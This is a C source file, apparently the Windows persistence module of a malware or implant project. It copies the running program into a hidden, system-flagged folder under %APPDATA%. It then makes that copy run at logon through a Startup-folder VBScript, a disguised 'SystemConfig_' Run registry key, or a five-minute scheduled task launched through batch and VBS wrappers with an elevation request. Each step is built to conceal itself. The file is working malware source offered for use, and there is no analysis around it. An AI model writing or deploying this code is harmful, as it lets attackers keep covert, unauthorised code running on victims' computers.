#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "persistence.h"

// Helper copied from previous stub implementation: create a hidden folder in %APPDATA% and copy the binary there
static BOOL create_hidden_binary(char *hidden_binary, size_t hidden_binary_size, const char *bin_path, const char *bin_name) {
    #ifndef PATH_BUF_LEN
    #define PATH_BUF_LEN 4096
    #endif

    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wformat-truncation"
    char appdata[PATH_BUF_LEN];
    if (!GetEnvironmentVariableA("APPDATA", appdata, PATH_BUF_LEN)) {
        return FALSE;
    }

    char rand_str[9];
    snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
    char search_path[PATH_BUF_LEN];
    snprintf(search_path, PATH_BUF_LEN, "%s\\.*", appdata);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search_path, &findData);
    int dot_folder_count = 0;
    char existing_folder[PATH_BUF_LEN] = "";
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    dot_folder_count++;
                    if (dot_folder_count == 1) {
                        snprintf(existing_folder, PATH_BUF_LEN, "%s\\%s", appdata, findData.cFileName);
                    }
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    char hidden_folder[PATH_BUF_LEN];
    if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
        strncpy(hidden_folder, existing_folder, PATH_BUF_LEN);
    } else {
        snprintf(hidden_folder, PATH_BUF_LEN, "%s\\.%.8s", appdata, rand_str);
        if (!CreateDirectoryA(hidden_folder, NULL)) {
            return FALSE;
        }
    }
    SetFileAttributesA(hidden_folder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    snprintf(hidden_binary, hidden_binary_size, "%s\\%s", hidden_folder, bin_name);
    if (!CopyFileA(bin_path, hidden_binary, FALSE)) {
        return FALSE;
    }
    SetFileAttributesA(hidden_binary, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return TRUE;
}

// Windows backend. Map old numeric persistence values to new enum.
int create_persistence(const PersistenceOpts *opts) {
    if (!opts) return -1;
    // For now implement the same three behaviors present in the legacy code.
    switch (opts->type) {
        case PERSIST_STARTUP_FOLDER: {
            char bin_path[PATH_BUF_LEN];
            if (!GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN)) return -1;
            char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
            char hidden_binary[PATH_BUF_LEN];
            if (!create_hidden_binary(hidden_binary, PATH_BUF_LEN, bin_path, bin_name)) return -1;
            char appdata_vbs[PATH_BUF_LEN];
            if (!GetEnvironmentVariableA("APPDATA", appdata_vbs, PATH_BUF_LEN)) return -1;
            char startup_folder[PATH_BUF_LEN];
            snprintf(startup_folder, PATH_BUF_LEN, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata_vbs);
            CreateDirectoryA(startup_folder, NULL);
            char vbs_path[PATH_BUF_LEN];
            char rand_str_vbs[9];
            snprintf(rand_str_vbs, sizeof(rand_str_vbs), "%08lx", GetTickCount());
            char hidden_service[32];
            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str_vbs);
            snprintf(vbs_path, PATH_BUF_LEN, "%s\\%.8s.vbs", startup_folder, hidden_service);
            char vbs_content[1024];
            snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);
            HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) return -1;
            DWORD bytesWritten;
            WriteFile(hFile, vbs_content, (DWORD)strlen(vbs_content), &bytesWritten, NULL);
            CloseHandle(hFile);
            return 0;
        }
        case PERSIST_REGISTRY_RUN: {
            char bin_path[PATH_BUF_LEN];
            if (!GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN)) return -1;
            char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
            char hidden_binary[PATH_BUF_LEN];
            if (!create_hidden_binary(hidden_binary, PATH_BUF_LEN, bin_path, bin_name)) return -1;
            HKEY hKey;
            LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
            if (result != ERROR_SUCCESS) return -1;
            char rand_str[9];
            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
            char hidden_service[128];
            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
            result = RegSetValueExA(hKey, hidden_service, 0, REG_SZ, (const BYTE*)hidden_binary, (DWORD)strlen(hidden_binary) + 1);
            RegCloseKey(hKey);
            if (result != ERROR_SUCCESS) return -1;
            return 0;
        }
        case PERSIST_SCHEDULED_TASK: {
            char bin_path[PATH_BUF_LEN];
            if (!GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN)) return -1;
            char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
            char hidden_binary[PATH_BUF_LEN];
            if (!create_hidden_binary(hidden_binary, PATH_BUF_LEN, bin_path, bin_name)) return -1;
            char batch_path[PATH_BUF_LEN];
            // Compute directory containing the hidden binary (not the full path with filename).
            char dirpart[PATH_BUF_LEN];
            char *p = strrchr(hidden_binary, '\\');
            if (p) {
                size_t dlen = (size_t)(p - hidden_binary);
                if (dlen >= sizeof(dirpart)) dlen = sizeof(dirpart) - 1;
                memcpy(dirpart, hidden_binary, dlen);
                dirpart[dlen] = '\0';
            } else {
                strcpy(dirpart, ".");
            }
            snprintf(batch_path, PATH_BUF_LEN, "%s\\run.bat", dirpart);
                char batch_content[2048];
                snprintf(batch_content, sizeof(batch_content), 
                    "@echo off\n"
                    "set FLAG=\"%%~dp0.last_run\"\n"
                    "set /a TIMEOUT=300\n"
                    "if not exist \"%%FLAG%%\" goto RUN\n"
                    "for /f %%t in (\"%%FLAG%%\") do set LAST=%%t\n"
                    "for /f \"tokens=1-2 delims=:.\" %%a in (\"%%TIME%%\") do set /a NOW=%%a*3600+%%b*60\n"
                    "for /f \"tokens=1-2 delims=:.\" %%c in (\"%%LAST%%\") do set /a OLD=%%c*3600+%%d*60\n"
                    "if %%NOW%% lss %%OLD%% set /a NOW+=86400\n"
                    "if %%NOW%%-%%OLD%% geq %%TIMEOUT%% goto RUN\n"
                    "exit /b\n"
                    ":RUN\n"
                    "start /MIN \"\" \"%s\"\n"
                    "echo %%TIME:~0,5%% > \"%%FLAG%%\"\n",
                    hidden_binary);
            HANDLE hFile = CreateFileA(batch_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) return -1;
            DWORD bytesWritten;
            WriteFile(hFile, batch_content, (DWORD)strlen(batch_content), &bytesWritten, NULL);
            CloseHandle(hFile);
            char vbs_path[PATH_BUF_LEN];
            snprintf(vbs_path, PATH_BUF_LEN, "%s\\run.vbs", dirpart);
            char vbs_content[1024];
                // Use cmd.exe /c to run the batch from VBScript; ensure proper quoting of the batch path.
                snprintf(vbs_content, sizeof(vbs_content), 
                    "Set WShell = CreateObject(\"WScript.Shell\")\n"
                    "WShell.Run \"cmd.exe /c \"\"%s\"\"\", 0, True\n",
                    batch_path);
            hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) return -1;
            WriteFile(hFile, vbs_content, (DWORD)strlen(vbs_content), &bytesWritten, NULL);
            CloseHandle(hFile);
            char cmd[2048];
            char rand_str[9];
            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
            char task_name[64];
            snprintf(task_name, sizeof(task_name), "SystemConfig_%s", rand_str);
            // Build schtasks command
            // Build schtasks command; run it directly (no extra cmd.exe wrapper)
            snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"%s\" /tr \"wscript.exe \"\"%s\"\"\" /sc minute /mo 5 /f", task_name, vbs_path);
            SHELLEXECUTEINFOA sei = {0};
            sei.cbSize = sizeof(sei);
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.lpVerb = "runas"; // request elevation if available
            sei.lpFile = "schtasks.exe";
            sei.lpParameters = cmd + strlen("schtasks "); // pass the parameters after the command name
            sei.nShow = SW_HIDE;
            if (!ShellExecuteExA(&sei)) {
                // Fallback to CreateProcess if ShellExecuteEx fails
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                memset(&si, 0, sizeof(si)); si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                char cmdline[2048];
                snprintf(cmdline, sizeof(cmdline), "%s", cmd);
                if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                    return -1;
                }
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            return 0;
        }
        case PERSIST_NONE:
        default:
            return 0; // nothing to do
    }
}

#pragma GCC diagnostic pop
